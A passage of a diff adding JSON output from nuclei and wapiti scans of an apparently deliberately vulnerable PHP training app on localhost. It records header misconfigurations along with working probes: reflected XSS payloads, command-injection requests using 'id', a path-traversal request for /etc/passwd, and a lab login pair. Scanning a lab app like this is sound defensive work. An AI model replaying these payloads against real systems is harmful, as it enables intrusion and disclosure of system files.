+          "request": "GET /www/XSS/XSS_level5.php/%61%27%22%3e%3c%69%6e%6a%65%63%74%61%62%6c%65%3e HTTP/1.1\r\nHost: localhost:9991\r\nUser-Agent: Mozilla/5.0 (Debian; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36\r\nConnection: close\r\nAccept: */*\r\nAccept-Language: en\r\nAccept-Encoding: gzip\r\n\r\n",
+          "response": "HTTP/1.1 200 OK\r\nConnection: close\r\nContent-Length: 668\r\nContent-Type: text/html; charset=UTF-8\r\nDate: Sun, 02 Nov 2025 09:51:16 GMT\r\nServer: Apache/2.4.18 (Unix) OpenSSL/1.0.2h PHP/5.6.21 mod_perl/2.0.8-dev Perl/v5.16.3\r\nX-Powered-By: PHP/5.6.21\r\n\r\n<!DOCTYPE html>\n<html>\n<head>\n    <title>XSS 5</title>\n<link rel=\"shortcut icon\" href=\"../Resources/hmbct.png\" />\n</head>\n<body>\n    \n\t <div style=\"background-color:#c9c9c9;padding:15px;\">\n      <button type=\"button\" name=\"homeButton\" onclick=\"location.href='../homepage.html';\">Home Page</button>\n      <button type=\"button\" name=\"mainButton\" onclick=\"location.href='xssmainpage.html';\">Main Page</button>\n    </div>\n<div align=\"center\">\n<form method=\"GET\" action=\"/www/XSS/XSS_level5.php/a'\"><injectable>\" name=\"form\">\n   <p>Your name:<input type=\"text\" name=\"username\"></p>\n   <input type=\"submit\" name=\"submit\" value=\"Submit\">\n</form>\n    </div>\n\n\n</body>\n</html>\n",
+          "ip": "127.0.0.1",
+          "curl-command": "curl -X 'GET' -d '' -H 'Accept: */*' -H 'Accept-Language: en' -H 'User-Agent: Mozilla/5.0 (Debian; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36' 'http://localhost:9991/www/XSS/XSS_level5.php/%61%27%22%3e%3c%69%6e%6a%65%63%74%61%62%6c%65%3e'"
+        }
+      ]
+    },
+    "wapiti": {
+      "Content Security Policy Configuration": [
+        {
+          "path": "/www/XSS/XSS_level5.php",
+          "info": "CSP is not set for URL: http://localhost:9991/www/XSS/XSS_level5.php",
+          "curl_command": "curl \"http://localhost:9991/www/XSS/XSS_level5.php\"",
+          "wstg": [
+            "WSTG-CONF-12",
+            "OSHP-Content-Security-Policy"
+          ]
+        }
+      ],
+      "Clickjacking Protection": [
+        {
+          "path": "/www/XSS/XSS_level5.php",
+          "info": "X-Frame-Options is not set",
+          "curl_command": "curl \"http://localhost:9991/www/XSS/XSS_level5.php\"",
+          "wstg": [
+            "OSHP-X-Frame-Options"
+          ]
+        }
+      ],
+      "MIME Type Confusion": [
+        {
+          "path": "/www/XSS/XSS_level5.php",
+          "info": "X-Content-Type-Options is not set",
+          "curl_command": "curl \"http://localhost:9991/www/XSS/XSS_level5.php\"",
+          "wstg": [
+            "OSHP-X-Content-Type-Options"
+          ]
+        }
+      ],
+      "Unencrypted Channels": [
+        {
+          "path": "/www/XSS/XSS_level5.php",
+          "info": "No HTTPS redirection for this host. All HTTP requests are served in clear text.",
+          "curl_command": "curl \"http://localhost:9991/www/XSS/XSS_level5.php\"",
+          "wstg": [
+            "WSTG-CRYP-03"
+          ]
+        },
+        {
+          "path": "/www/XSS/XSS_level5.php",
+          "info": "Sensitive data (GET parameters) was sent over an unencrypted HTTP connection to http://localhost:9991/www/XSS/XSS_level5.php?username=alice&submit=Submit. The server did not enforce HTTPS.",
+          "curl_command": "curl \"http://localhost:9991/www/XSS/XSS_level5.php?username=alice&submit=Submit\" -e \"http://localhost:9991/www/XSS/XSS_level5.php\"",
+          "wstg": [
+            "WSTG-CRYP-03"
+          ]
+        }
+      ]
+    }
+  },
+  "www_CommandExecution_CommandExec-1_php": {
+    "nuclei": {},
+    "wapiti": {
+      "Cleartext Submission of Password": [
+        {
+          "path": "/www/CommandExecution/CommandExec-1.php",
+          "info": "Password field password sent in clear text from URL http://localhost:9991/www/CommandExecution/CommandExec-1.php",
+          "parameter": "password",
+          "curl_command": "curl \"http://localhost:9991/www/CommandExecution/CommandExec-1.php\"",
+          "wstg": [
+            "WSTG-CONF-07"
+          ]
+        },
+        {
+          "path": "/www/CommandExecution/CommandExec-1.php",
+          "info": "Password field password sent in clear text from URL http://localhost:9991/www/CommandExecution/CommandExec-1.php?username=Admin&password=Letm3in_",
+          "parameter": "password",
+          "curl_command": "curl \"http://localhost:9991/www/CommandExecution/CommandExec-1.php?username=Admin&password=Letm3in_\" -e \"http://localhost:9991/www/CommandExecution/CommandExec-1.php\"",
+          "wstg": [
+            "WSTG-CONF-07"
+          ]
+        }
+      ],
+      "Content Security Policy Configuration": [
+        {
+          "path": "/www/CommandExecution/CommandExec-1.php",
+          "info": "CSP is not set for URL: http://localhost:9991/www/CommandExecution/CommandExec-1.php",
+          "curl_command": "curl \"http://localhost:9991/www/CommandExecution/CommandExec-1.php\"",
+          "wstg": [
+            "WSTG-CONF-12",
+            "OSHP-Content-Security-Policy"
+          ]
+        }
+      ],
+      "Command execution": [
+        {
+          "path": "/www/CommandExecution/CommandExec-1.php",
+          "info": "Command execution via injection in the parameter username",
+          "parameter": "username",
+          "curl_command": "curl \"http://localhost:9991/www/CommandExecution/CommandExec-1.php?username=id&password=Letm3in_\" -e \"http://localhost:9991/www/CommandExecution/CommandExec-1.php\"",
+          "wstg": [
+            "WSTG-INPV-12"
+          ]
+        }
+      ],
+      "Clickjacking Protection": [
+        {
+          "path": "/www/CommandExecution/CommandExec-1.php",
+          "info": "X-Frame-Options is not set",
+          "curl_command": "curl \"http://localhost:9991/www/CommandExecution/CommandExec-1.php\"",
+          "wstg": [
+            "OSHP-X-Frame-Options"
+          ]
+        }
+      ],
+      "MIME Type Confusion": [
+        {
+          "path": "/www/CommandExecution/CommandExec-1.php",
+          "info": "X-Content-Type-Options is not set",
+          "curl_command": "curl \"http://localhost:9991/www/CommandExecution/CommandExec-1.php\"",
+          "wstg": [
+            "OSHP-X-Content-Type-Options"
+          ]
+        }
+      ],
+      "Unencrypted Channels": [
+        {
+          "path": "/www/CommandExecution/CommandExec-1.php",
+          "info": "No HTTPS redirection for this host. All HTTP requests are served in clear text.",
+          "curl_command": "curl \"http://localhost:9991/www/CommandExecution/CommandExec-1.php\"",
+          "wstg": [
+            "WSTG-CRYP-03"
+          ]
+        },
+        {
+          "path": "/www/CommandExecution/CommandExec-1.php",
+          "info": "Sensitive data (GET parameters) was sent over an unencrypted HTTP connection to http://localhost:9991/www/CommandExecution/CommandExec-1.php?username=Admin&password=Letm3in_. The server did not enforce HTTPS.",
+          "curl_command": "curl \"http://localhost:9991/www/CommandExecution/CommandExec-1.php?username=Admin&password=Letm3in_\" -e \"http://localhost:9991/www/CommandExecution/CommandExec-1.php\"",
+          "wstg": [
+            "WSTG-CRYP-03"
+          ]
+        }
+      ]
+    }
+  },
+  "www_homepage_html": {
+    "nuclei": {},
+    "wapiti": {
+      "Content Security Policy Configuration": [
+        {
+          "path": "/www/homepage.html",
+          "info": "CSP is not set for URL: http://localhost:9991/www/homepage.html",
+          "curl_command": "curl \"http://localhost:9991/www/homepage.html\"",
+          "wstg": [
+            "WSTG-CONF-12",
+            "OSHP-Content-Security-Policy"
+          ]
+        }
+      ],
+      "Clickjacking Protection": [
+        {
+          "path": "/www/homepage.html",
+          "info": "X-Frame-Options is not set",
+          "curl_command": "curl \"http://localhost:9991/www/homepage.html\"",
+          "wstg": [
+            "OSHP-X-Frame-Options"
+          ]
+        }
+      ],
+      "MIME Type Confusion": [
+        {
+          "path": "/www/homepage.html",
+          "info": "X-Content-Type-Options is not set",
+          "curl_command": "curl \"http://localhost:9991/www/homepage.html\"",
+          "wstg": [
+            "OSHP-X-Content-Type-Options"
+          ]
+        }
+      ],
+      "Unencrypted Channels": [
+        {
+          "path": "/www/homepage.html",
+          "info": "No HTTPS redirection for this host. All HTTP requests are served in clear text.",
+          "curl_command": "curl \"http://localhost:9991/www/homepage.html\"",
+          "wstg": [
+            "WSTG-CRYP-03"
+          ]
+        }
+      ]
+    }
+  },
+  "www_FileInclusion_pages_lvl2_php": {
+    "nuclei": {},
+    "wapiti": {
+      "Content Security Policy Configuration": [
+        {
+          "path": "/www/FileInclusion/pages/lvl2.php",
+          "info": "CSP is not set for URL: http://localhost:9991/www/FileInclusion/pages/lvl2.php",
+          "curl_command": "curl \"http://localhost:9991/www/FileInclusion/pages/lvl2.php\"",
+          "wstg": [
+            "WSTG-CONF-12",
+            "OSHP-Content-Security-Policy"
+          ]
+        }
+      ],
+      "Path Traversal": [
+        {
+          "path": "/www/FileInclusion/pages/lvl2.php",
+          "info": "Linux local file disclosure vulnerability via injection in the parameter file",
+          "parameter": "file",
+          "curl_command": "curl \"http://localhost:9991/www/FileInclusion/pages/lvl2.php?file=%2Fetc%2Fpasswd\"",
+          "wstg": [
+            "WSTG-ATHZ-01"
+          ]
+        }
+      ],
+      "Clickjacking Protection": [
+        {
+          "path": "/www/FileInclusion/pages/lvl2.php",
+          "info": "X-Frame-Options is not set",
+          "curl_command": "curl \"http://localhost:9991/www/FileInclusion/pages/lvl2.php\"",
+          "wstg": [
+            "OSHP-X-Frame-Options"
+          ]
+        }
+      ],
+      "MIME Type Confusion": [
+        {
+          "path": "/www/FileInclusion/pages/lvl2.php",
+          "info": "X-Content-Type-Options is not set",
+          "curl_command": "curl \"http://localhost:9991/www/FileInclusion/pages/lvl2.php\"",
+          "wstg": [
+            "OSHP-X-Content-Type-Options"
+          ]
+        }
+      ],
+      "Unencrypted Channels": [
+        {
+          "path": "/www/FileInclusion/pages/lvl2.php",
+          "info": "No HTTPS redirection for this host. All HTTP requests are served in clear text.",
+          "curl_command": "curl \"http://localhost:9991/www/FileInclusion/pages/lvl2.php\"",
+          "wstg": [
+            "WSTG-CRYP-03"
+          ]
+        },
+        {
+          "path": "/www/FileInclusion/pages/lvl2.php",
+          "info": "Sensitive data (GET parameters) was sent over an unencrypted HTTP connection to http://localhost:9991/www/FileInclusion/pages/lvl2.php?file=1.php. The server did not enforce HTTPS.",
+          "curl_command": "curl \"http://localhost:9991/www/FileInclusion/pages/lvl2.php?file=1.php\"",
+          "wstg": [
+            "WSTG-CRYP-03"
+          ]
+        }
+      ],
+      "Reflected Cross Site Scripting": [
+        {
+          "path": "/www/FileInclusion/pages/lvl2.php",
+          "info": "Reflected Cross Site Scripting vulnerability found via injection in the parameter file",
+          "parameter": "file",
+          "curl_command": "curl \"http://localhost:9991/www/FileInclusion/pages/lvl2.php?file=%3CScRiPt%3Ealert%28%27wop59tsyfi%27%29%3C%2FsCrIpT%3E\"",
+          "wstg": [
+            "WSTG-INPV-01"
+          ]
+        }
+      ]
+    }
+  },
+  "www_FileUpload_multipart_form-data": {
+    "nuclei": {},
+    "wapiti": {
+      "Content Security Policy Configuration": [
+        {
+          "path": "/www/FileUpload/multipart/form-data",
+          "info": "CSP is not set for URL: http://localhost:9991/www/FileUpload/multipart/form-data",
+          "curl_command": "curl \"http://localhost:9991/www/FileUpload/multipart/form-data\"",
+          "wstg": [
+            "WSTG-CONF-12",
+            "OSHP-Content-Security-Policy"
+          ]
+        }
+      ],
+      "Clickjacking Protection": [
+        {
+          "path": "/www/FileUpload/multipart/form-data",
+          "info": "X-Frame-Options is not set",
+          "curl_command": "curl \"http://localhost:9991/www/FileUpload/multipart/form-data\"",
+          "wstg": [
+            "OSHP-X-Frame-Options"
+          ]
+        }
+      ],
+      "MIME Type Confusion": [
+        {
+          "path": "/www/FileUpload/multipart/form-data",
+          "info": "X-Content-Type-Options is not set",
+          "curl_command": "curl \"http://localhost:9991/www/FileUpload/multipart/form-data\"",
+          "wstg": [
+            "OSHP-X-Content-Type-Options"
+          ]
+        }
+      ],
+      "Unencrypted Channels": [
+        {
+          "path": "/www/FileUpload/multipart/form-data",
+          "info": "No HTTPS redirection for this host. All HTTP requests are served in clear text.",
+          "curl_command": "curl \"http://localhost:9991/www/FileUpload/multipart/form-data\"",
+          "wstg": [
+            "WSTG-CRYP-03"
+          ]
+        }
+      ]
+    }
+  },
+  "www_FileInclusion_pages_lvl4_php": {
+    "nuclei": {},
+    "wapiti": {
+      "Content Security Policy Configuration": [
+        {
+          "path": "/www/FileInclusion/pages/lvl4.php",
+          "info": "CSP is not set for URL: http://localhost:9991/www/FileInclusion/pages/lvl4.php",
+          "curl_command": "curl \"http://localhost:9991/www/FileInclusion/pages/lvl4.php\"",
+          "wstg": [
+            "WSTG-CONF-12",
+            "OSHP-Content-Security-Policy"
+          ]
+        }
+      ],
+      "Clickjacking Protection": [
+        {
+          "path": "/www/FileInclusion/pages/lvl4.php",
+          "info": "X-Frame-Options is not set",
+          "curl_command": "curl \"http://localhost:9991/www/FileInclusion/pages/lvl4.php\"",
+          "wstg": [
+            "OSHP-X-Frame-Options"
+          ]
+        }
+      ],
+      "MIME Type Confusion": [
+        {
+          "path": "/www/FileInclusion/pages/lvl4.php",
+          "info": "X-Content-Type-Options is not set",
+          "curl_command": "curl \"http://localhost:9991/www/FileInclusion/pages/lvl4.php\"",
+          "wstg": [
+            "OSHP-X-Content-Type-Options"
+          ]
+        }
+      ],
+      "Unencrypted Channels": [
+        {
+          "path": "/www/FileInclusion/pages/lvl4.php",
+          "info": "No HTTPS redirection for this host. All HTTP requests are served in clear text.",
+          "curl_command": "curl \"http://localhost:9991/www/FileInclusion/pages/lvl4.php\"",
+          "wstg": [
+            "WSTG-CRYP-03"
+          ]
+        },
+        {
+          "path": "/www/FileInclusion/pages/lvl4.php",
+          "info": "Sensitive data (GET parameters) was sent over an unencrypted HTTP connection to http://localhost:9991/www/FileInclusion/pages/lvl4.php?file=1.php. The server did not enforce HTTPS.",
+          "curl_command": "curl \"http://localhost:9991/www/FileInclusion/pages/lvl4.php?file=1.php\"",
+          "wstg": [
+            "WSTG-CRYP-03"
+          ]
+        }
+      ]
+    }
+  },
+  "www_FileUpload_fileupload1_php": {
+    "nuclei": {},
+    "wapiti": {
+      "Content Security Policy Configuration": [
+        {
+          "path": "/www/FileUpload/fileupload1.php",
+          "info": "CSP is not set for URL: http://localhost:9991/www/FileUpload/fileupload1.php",
+          "curl_command": "curl \"http://localhost:9991/www/FileUpload/fileupload1.php\"",
+          "wstg": [
+            "WSTG-CONF-12",
+            "OSHP-Content-Security-Policy"
+          ]
+        }
+      ],
+      "Path Traversal": [
+        {
+          "path": "/www/FileUpload/fileupload1.php",
+          "info": "Possible move_uploaded_file() vulnerability via injection in the parameter file (Constraints: prefix)",
+          "parameter": "file",
+          "curl_command": "curl \"http://localhost:9991/www/FileUpload/fileupload1.php\" -e \"http://localhost:9991/www/FileUpload/fileupload1.php\" -F \"submit=Submit\" -F \"file=@your_local_file;filename=fileupload1.php\"",
+          "wstg": [
+            "WSTG-ATHZ-01"
+          ]
+        }
+      ],
+      "Clickjacking Protection": [
+        {
+          "path": "/www/FileUpload/fileupload1.php",
+          "info": "X-Frame-Options is not set",
+          "curl_command": "curl \"http://localhost:9991/www/FileUpload/fileupload1.php\"",
+          "wstg": [
+            "OSHP-X-Frame-Options"
+          ]
+        }
+      ],
+      "MIME Type Confusion": [
+        {
+          "path": "/www/FileUpload/fileupload1.php",
+          "info": "X-Content-Type-Options is not set",
+          "curl_command": "curl \"http://localhost:9991/www/FileUpload/fileupload1.php\"",
+          "wstg": [
+            "OSHP-X-Content-Type-Options"
+          ]
+        }
+      ],
+      "Unencrypted Channels": [
+        {
+          "path": "/www/FileUpload/fileupload1.php",
+          "info": "No HTTPS redirection for this host. All HTTP requests are served in clear text.",
+          "curl_command": "curl \"http://localhost:9991/www/FileUpload/fileupload1.php\"",
+          "wstg": [
+            "WSTG-CRYP-03"
+          ]
+        },
+        {
+          "path": "/www/FileUpload/fileupload1.php",
+          "info": "Sensitive data (POST data) was sent over an unencrypted HTTP connection to http://localhost:9991/www/FileUpload/fileupload1.php. The server did not enforce HTTPS.",
+          "curl_command": "curl \"http://localhost:9991/www/FileUpload/fileupload1.php\" -e \"http://localhost:9991/www/FileUpload/fileupload1.php\" -F \"submit=Submit\" -F \"file=@your_local_file;filename=pix.gif\"",
+          "wstg": [
+            "WSTG-CRYP-03"
+          ]
+        }
+      ],
+      "Information Disclosure - Full Path": [
+        {
+          "path": "/www/FileUpload/fileupload1.php",
+          "info": "Response contains potential system path: /opt/lampp/temp/phpCp3aEb",
+          "curl_command": "curl \"http://localhost:9991/www/FileUpload/fileupload1.php\" -e \"http://localhost:9991/www/FileUpload/fileupload1.php\" -F \"submit=Submit\" -F \"file=@your_local_file;filename=pix.gif\"",
+          "wstg": [
+            "WSTG-ERRH-01"
+          ]
+        }
+      ],
+      "Reflected Cross Site Scripting": [
+        {
+          "path": "/www/FileUpload/fileupload1.php",
+          "info": "Reflected Cross Site Scripting vulnerability found via injection in the parameter file",
+          "parameter": "file",
+          "curl_command": "curl \"http://localhost:9991/www/FileUpload/fileupload1.php\" -e \"http://localhost:9991/www/FileUpload/fileupload1.php\" -F \"submit=Submit\" -F \"file=@your_local_file;filename=<ImG src=z oNeRror=alert('wptpkn7uz7')>\"",
+          "wstg": [
+            "WSTG-INPV-01"
+          ]
+        }
+      ]
+    }
+  },
+  "www_CommandExecution_CommandExec-2_php": {
+    "nuclei": {},
+    "wapiti": {
+      "Content Security Policy Configuration": [
+        {
+          "path": "/www/CommandExecution/CommandExec-2.php",
+          "info": "CSP is not set for URL: http://localhost:9991/www/CommandExecution/CommandExec-2.php",
+          "curl_command": "curl \"http://localhost:9991/www/CommandExecution/CommandExec-2.php\"",
+          "wstg": [
+            "WSTG-CONF-12",
+            "OSHP-Content-Security-Policy"
+          ]
+        }
+      ],
+      "Command execution": [
+        {
+          "path": "/www/CommandExecution/CommandExec-2.php",
+          "info": "Command execution via injection in the parameter typeBox",
+          "parameter": "typeBox",
+          "curl_command": "curl \"http://localhost:9991/www/CommandExecution/CommandExec-2.php?typeBox=id\" -e \"http://localhost:9991/www/CommandExecution/CommandExec-2.php\"",
+          "wstg": [
+            "WSTG-INPV-12"
+          ]
+        }
+      ],
+      "Clickjacking Protection": [
+        {
+          "path": "/www/CommandExecution/CommandExec-2.php",
+          "info": "X-Frame-Options is not set",
+          "curl_command": "curl \"http://localhost:9991/www/CommandExecution/CommandExec-2.php\"",
+          "wstg": [
+            "OSHP-X-Frame-Options"
+          ]
+        }
+      ],
+      "MIME Type Confusion": [
+        {
+          "path": "/www/CommandExecution/CommandExec-2.php",
+          "info": "X-Content-Type-Options is not set",
+          "curl_command": "curl \"http://localhost:9991/www/CommandExecution/CommandExec-2.php\"",
+          "wstg": [
+            "OSHP-X-Content-Type-Options"
+          ]
+        }
+      ],
+      "Unencrypted Channels": [
+        {
+          "path": "/www/CommandExecution/CommandExec-2.php",
+          "info": "No HTTPS redirection for this host. All HTTP requests are served in clear text.",
+          "curl_command": "curl \"http://localhost:9991/www/CommandExecution/CommandExec-2.php\"",
+          "wstg": [
+            "WSTG-CRYP-03"
+          ]
+        },
+        {
+          "path": "/www/CommandExecution/CommandExec-2.php",
+          "info": "Sensitive data (GET parameters) was sent over an unencrypted HTTP connection to http://localhost:9991/www/CommandExecution/CommandExec-2.php?typeBox=default. The server did not enforce HTTPS.",
+          "curl_command": "curl \"http://localhost:9991/www/CommandExecution/CommandExec-2.php?typeBox=default\" -e \"http://localhost:9991/www/CommandExecution/CommandExec-2.php\"",
+          "wstg": [
+            "WSTG-CRYP-03"
+          ]
+        }
+      ]
+    }
+  },
+  "www_FileUpload_fileupload3_php": {
+    "nuclei": {},
+    "wapiti": {
+      "Content Security Policy Configuration": [
+        {
+          "path": "/www/FileUpload/fileupload3.php",
+          "info": "CSP is not set for URL: http://localhost:9991/www/FileUpload/fileupload3.php",
+          "curl_command": "curl \"http://localhost:9991/www/FileUpload/fileupload3.php\"",
+          "wstg": [
+            "WSTG-CONF-12",
+            "OSHP-Content-Security-Policy"
+          ]
+        }
+      ],
+      "Clickjacking Protection": [
+        {
+          "path": "/www/FileUpload/fileupload3.php",
+          "info": "X-Frame-Options is not set",
+          "curl_command": "curl \"http://localhost:9991/www/FileUpload/fileupload3.php\"",
+          "wstg": [
+            "OSHP-X-Frame-Options"
+          ]
+        }
+      ],
+      "MIME Type Confusion": [
+        {
+          "path": "/www/FileUpload/fileupload3.php",
+          "info": "X-Content-Type-Options is not set",
+          "curl_command": "curl \"http://localhost:9991/www/FileUpload/fileupload3.php\"",
+          "wstg": [
+            "OSHP-X-Content-Type-Options"
+          ]
+        }
+      ],
+      "Unencrypted Channels": [
+        {
+          "path": "/www/FileUpload/fileupload3.php",
+          "info": "No HTTPS redirection for this host. All HTTP requests are served in clear text.",
+          "curl_command": "curl \"http://localhost:9991/www/FileUpload/fileupload3.php\"",
+          "wstg": [
+            "WSTG-CRYP-03"
+          ]
+        },
+        {
+          "path": "/www/FileUpload/fileupload3.php",
+          "info": "Sensitive data (POST data) was sent over an unencrypted HTTP connection to http://localhost:9991/www/FileUpload/fileupload3.php. The server did not enforce HTTPS.",
+          "curl_command": "curl \"http://localhost:9991/www/FileUpload/fileupload3.php\" -e \"http://localhost:9991/www/FileUpload/fileupload3.php\" -F \"submit=Submit\" -F \"file=@your_local_file;filename=pix.gif\"",
+          "wstg": [
+            "WSTG-CRYP-03"
+          ]
+        }
+      ]
+    }
+  },
+  "www_Resources_hmbct_png": {
+    "nuclei": {},
+    "wapiti": {
+      "Clickjacking Protection": [
+        {
+          "path": "/www/Resources/hmbct.png",
+          "info": "X-Frame-Options is not set",
+          "curl_command": "curl \"http://localhost:9991/www/Resources/hmbct.png\"",
+          "wstg": [
+            "OSHP-X-Frame-Options"
+          ]
+        }
+      ],
+      "MIME Type Confusion": [
+        {
+          "path": "/www/Resources/hmbct.png",
+          "info": "X-Content-Type-Options is not set",
+          "curl_command": "curl \"http://localhost:9991/www/Resources/hmbct.png\"",
+          "wstg": [
+            "OSHP-X-Content-Type-Options"
+          ]
+        }
+      ]
+    }
+  },
+  "www_FileInclusion_pages_fileinc_html": {
+    "nuclei": {},
+    "wapiti": {
+      "Content Security Policy Configuration": [
+        {
+          "path": "/www/FileInclusion/pages/fileinc.html",
+          "info": "CSP is not set for URL: http://localhost:9991/www/FileInclusion/pages/fileinc.html",
+          "curl_command": "curl \"http://localhost:9991/www/FileInclusion/pages/fileinc.html\"",
+          "wstg": [
+            "WSTG-CONF-12",
+            "OSHP-Content-Security-Policy"
+          ]
+        }
+      ],
+      "Clickjacking Protection": [
+        {
+          "path": "/www/FileInclusion/pages/fileinc.html",
+          "info": "X-Frame-Options is not set",
+          "curl_command": "curl \"http://localhost:9991/www/FileInclusion/pages/fileinc.html\"",
+          "wstg": [
+            "OSHP-X-Frame-Options"
+          ]
+        }
+      ],
+      "MIME Type Confusion": [
+        {
+          "path": "/www/FileInclusion/pages/fileinc.html",
+          "info": "X-Content-Type-Options is not set",
+          "curl_command": "curl \"http://localhost:9991/www/FileInclusion/pages/fileinc.html\"",
+          "wstg": [
+            "OSHP-X-Content-Type-Options"
+          ]
+        }
+      ],
+      "Unencrypted Channels": [
+        {
+          "path": "/www/FileInclusion/pages/fileinc.html",
+          "info": "No HTTPS redirection for this host. All HTTP requests are served in clear text.",
+          "curl_command": "curl \"http://localhost:9991/www/FileInclusion/pages/fileinc.html\"",
+          "wstg": [
+            "WSTG-CRYP-03"
+          ]
+        }
+      ]
+    }
+  },
+  "www_XSS_XSS_level2_php": {
+    "nuclei": {
+      "sql": [],
+      "cve": [],
+      "xss": [
+        {
+          "info": {
+            "name": "Fuzzing Parameters - Cross-Site Scripting",
+            "description": "Cross-site scripting was discovered via a search for reflected parameter values in the server response via GET-requests.\n",
+            "impact": "N/A",
+            "severity": "medium",
+            "classification": {
+              "cve-id": []
+            }
+          },
+          "matched-at": "http://localhost:9991/www/XSS/XSS_level2.php/?location=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-location%27%29%3E&link_url=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-link_url%27%29%3E&post_mime_type=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-post_mime_type%27%29%3E&uid=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-uid%27%29%3E&host=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-host%27%29%3E&cmd=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-cmd%27%29%3E&link_id=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-link_id%27%29%3E&reset=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-reset%27%29%3E&nonce=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-nonce%27%29%3E&username=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-username%27%29%3E&site=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-site%27%29%3E&do=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-do%27%29%3E&email=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-email%27%29%3E",
+          "request": "GET /www/XSS/XSS_level2.php/?location=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-location%27%29%3E&link_url=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-link_url%27%29%3E&post_mime_type=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-post_mime_type%27%29%3E&uid=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-uid%27%29%3E&host=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-host%27%29%3E&cmd=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-cmd%27%29%3E&link_id=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-link_id%27%29%3E&reset=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-reset%27%29%3E&nonce=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-nonce%27%29%3E&username=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-username%27%29%3E&site=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-site%27%29%3E&do=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-do%27%29%3E&email=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-email%27%29%3E HTTP/1.1\r\nHost: localhost:9991\r\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Mobile/15E148 Safari/604.1\r\nAccept: */*\r\nAccept-Language: en\r\nAccept-Encoding: gzip\r\n\r\n",
+          "response": "HTTP/1.1 200 OK\r\nConnection: close\r\nContent-Length: 676\r\nContent-Type: text/html; charset=UTF-8\r\nDate: Sun, 02 Nov 2025 09:51:11 GMT\r\nServer: Apache/2.4.18 (Unix) OpenSSL/1.0.2h PHP/5.6.21 mod_perl/2.0.8-dev Perl/v5.16.3\r\nX-Powered-By: PHP/5.6.21\r\n\r\n<!DOCTYPE html>\n<html>\n<head>\n   <title>XSS 2</title>\n<link rel=\"shortcut icon\" href=\"../Resources/hmbct.png\" />\n</head>\n<body>\n\t\n\t <div style=\"background-color:#c9c9c9;padding:15px;\">\n      <button type=\"button\" name=\"homeButton\" onclick=\"location.href='../homepage.html';\">Home Page</button>\n      <button type=\"button\" name=\"mainButton\" onclick=\"location.href='xssmainpage.html';\">Main Page</button>\n    </div>\n<div align=\"center\">\n   <form method=\"GET\" action=\"\" name=\"form\">\n   <p>Your name:<input type=\"text\" name=\"username\"></p>\n   <input type=\"submit\" name=\"submit\" value=\"Submit\">\n</form>\n\t</div>\nYour name is '>\"<svg/onload=confirm('xss-username')>\n\n</body>\n</html>\n",
+          "ip": "127.0.0.1",
+          "curl-command": "curl -X 'GET' -d '' -H 'Accept: */*' -H 'Accept-Language: en' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Mobile/15E148 Safari/604.1' 'http://localhost:9991/www/XSS/XSS_level2.php/?location=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-location%27%29%3E&link_url=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-link_url%27%29%3E&post_mime_type=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-post_mime_type%27%29%3E&uid=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-uid%27%29%3E&host=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-host%27%29%3E&cmd=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-cmd%27%29%3E&link_id=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-link_id%27%29%3E&reset=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-reset%27%29%3E&nonce=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-nonce%27%29%3E&username=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-username%27%29%3E&site=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-site%27%29%3E&do=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-do%27%29%3E&email=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-email%27%29%3E'"
+        }
+      ]
+    },
+    "wapiti": {
+      "Content Security Policy Configuration": [
+        {
+          "path": "/www/XSS/XSS_level2.php",
+          "info": "CSP is not set for URL: http://localhost:9991/www/XSS/XSS_level2.php",
+          "curl_command": "curl \"http://localhost:9991/www/XSS/XSS_level2.php\"",
+          "wstg": [
+            "WSTG-CONF-12",
+            "OSHP-Content-Security-Policy"
+          ]
+        }
+      ],
+      "Clickjacking Protection": [
+        {
+          "path": "/www/XSS/XSS_level2.php",
+          "info": "X-Frame-Options is not set",
+          "curl_command": "curl \"http://localhost:9991/www/XSS/XSS_level2.php\"",
+          "wstg": [
+            "OSHP-X-Frame-Options"
+          ]
+        }
+      ],
+      "MIME Type Confusion": [
+        {
+          "path": "/www/XSS/XSS_level2.php",
